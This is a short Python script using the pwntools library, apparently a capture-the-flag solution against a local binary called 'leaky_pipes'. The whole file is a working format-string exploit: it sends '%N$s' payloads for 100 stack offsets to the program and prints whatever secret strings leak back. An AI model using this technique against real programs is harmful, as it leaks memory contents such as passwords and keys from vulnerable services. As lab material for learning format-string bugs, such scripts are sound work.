from importlib.util import source_from_cache
from pwn import *
import string
context.log_level = "warn"
e = ELF("leaky_pipes")

payload = b""
for x in range(100):
    payload ="%{}$s".format(x).encode()
    p = process("leaky_pipes")
    p.recvuntil(b">>")
    p.sendline(payload)

    secret = p.recvall().split(b'\n')[1]

    print(payload, " ", x, " ", secret)
